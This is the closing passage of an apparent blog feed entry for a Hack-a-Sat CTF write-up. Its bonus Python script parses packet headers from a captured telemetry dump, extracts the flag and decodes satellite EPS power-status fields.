<p>I hope you liked the explanation. I didn’t take a deep dive in XTCE stuff but just the enough to get the flag. The XTCE format looks interesting (pretty much like a protobuf but in XML) and I will take a look eventually. That also has been my first CTF in my life and was really fun to play!</p>

<h2 id="bonus">BONUS</h2>

<p>We can also decode the EPS data which should give us some satellite info (and a spoiler to the next flag):</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="kn">from</span> <span class="nn">pprint</span> <span class="kn">import</span> <span class="n">pprint</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"dump.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">c_version</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span>
  <span class="n">c_type</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
  <span class="n">c_sechd</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
  <span class="n">c_apid</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">c_gpflags</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span>
  <span class="n">c_ssc</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
  <span class="n">c_plen</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="p">)</span>
  <span class="k">return</span> <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span>

<span class="k">def</span> <span class="nf">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">bitstream</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">format</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">"08b"</span><span class="p">):</span>
      <span class="n">bitstream</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>

  <span class="n">flagdata</span> <span class="o">=</span> <span class="s">""</span>

  <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">b</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">b</span> <span class="o">+=</span> <span class="n">bitstream</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">b</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
      <span class="n">flagdata</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="n">bitstream</span> <span class="o">=</span> <span class="n">bitstream</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>

  <span class="k">return</span> <span class="n">flagdata</span>

<span class="k">def</span> <span class="nf">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">battemp</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
  <span class="n">voltage</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">low_pwr_thresh</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>

  <span class="n">LOW_PWR_MODE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">BATT_HTR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">PAYLOAD_PWR</span>   <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>

  <span class="n">PAYLOAD_ENABLE</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
  <span class="n">BAD_CMD_COUNT</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;I"</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

  <span class="k">return</span> <span class="p">{</span>
    <span class="s">"low_pwr_thresh"</span><span class="p">:</span> <span class="n">low_pwr_thresh</span><span class="p">,</span>
    <span class="s">"voltage"</span><span class="p">:</span> <span class="n">voltage</span><span class="p">,</span>
    <span class="s">"LOW_PWR_MODE"</span><span class="p">:</span> <span class="n">LOW_PWR_MODE</span><span class="p">,</span>
    <span class="s">"BATT_HTR"</span><span class="p">:</span> <span class="n">BATT_HTR</span><span class="p">,</span>
    <span class="s">"PAYLOAD_PWR"</span><span class="p">:</span> <span class="n">PAYLOAD_PWR</span><span class="p">,</span>
    <span class="s">"FLAG_PWR"</span><span class="p">:</span> <span class="n">FLAG_PWR</span><span class="p">,</span>
    <span class="s">"ADCS_PWR"</span><span class="p">:</span> <span class="n">ADCS_PWR</span><span class="p">,</span>
    <span class="s">"RADIO1_PWR"</span><span class="p">:</span> <span class="n">RADIO1_PWR</span><span class="p">,</span>
    <span class="s">"RADIO2_PWR"</span><span class="p">:</span> <span class="n">RADIO2_PWR</span><span class="p">,</span>
    <span class="s">"PAYLOAD_ENABLE"</span><span class="p">:</span> <span class="n">PAYLOAD_ENABLE</span><span class="p">,</span>
    <span class="s">"FLAG_ENABLE"</span><span class="p">:</span> <span class="n">FLAG_ENABLE</span><span class="p">,</span>
    <span class="s">"ADCS_ENABLE"</span><span class="p">:</span> <span class="n">ADCS_ENABLE</span><span class="p">,</span>
    <span class="s">"RADIO1_ENABLE"</span><span class="p">:</span> <span class="n">RADIO1_ENABLE</span><span class="p">,</span>
    <span class="s">"RADIO2_ENABLE"</span><span class="p">:</span> <span class="n">RADIO2_ENABLE</span><span class="p">,</span>
    <span class="s">"BAD_CMD_COUNT"</span><span class="p">:</span> <span class="n">BAD_CMD_COUNT</span><span class="p">,</span>
  <span class="p">}</span>

<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
  <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span> <span class="o">=</span> <span class="n">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"GOT PACKET %d with LENGTH %d"</span> <span class="o">%</span><span class="p">(</span><span class="n">c_apid</span><span class="p">,</span> <span class="n">c_plen</span><span class="p">))</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>         <span class="c1"># Skip the header
</span>                          <span class="c1"># data[:c_plen+1] has content
</span>  <span class="k">if</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="mi">102</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="n">c_plen</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"THE FLAG: %s"</span> <span class="o">%</span> <span class="n">flag</span><span class="p">)</span>
  <span class="k">elif</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="mi">103</span><span class="p">:</span>
   <span class="n">pprint</span><span class="p">(</span><span class="n">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">c_plen</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>  <span class="c1"># remove the current data
</span></code></pre></div></div>

<p><img src="/assets/posts/medium/1_zs_TGnP0aqNndWHg_h8rKw.png" alt="" /></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Hack-a-sat — Can you hear me now?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_87tDTK5_FodI9TghHRpznQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_87tDTK5_FodI9TghHRpznQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>